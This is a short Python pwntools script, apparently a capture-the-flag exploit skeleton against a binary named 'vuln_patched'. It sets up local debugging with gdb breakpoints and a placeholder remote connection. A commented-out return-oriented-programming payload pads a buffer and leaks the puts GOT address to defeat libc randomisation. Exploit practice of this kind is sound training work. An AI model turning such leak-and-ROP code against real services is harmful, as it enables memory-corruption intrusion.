#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript = '''
                   b*menu+208
                   b*menu+227
                   b*next
                   c
                   ''')
    else:
        r = remote("addr", 1337)

    return r


def main():

    r = conn()
    input()
    r.sendlineafter(b"Enter here: ", b"2")
    # pop_rdi = 0x00000000000013f3
    # payload = b"a" * 8 * 5
    # payload += flat(
    #     pop_rdi, exe.got['puts'], exe.plt['puts']
    # )
    # r.sendlineafter(b"to it!\n", payload)

    r.interactive()


if __name__ == "__main__":
    main()
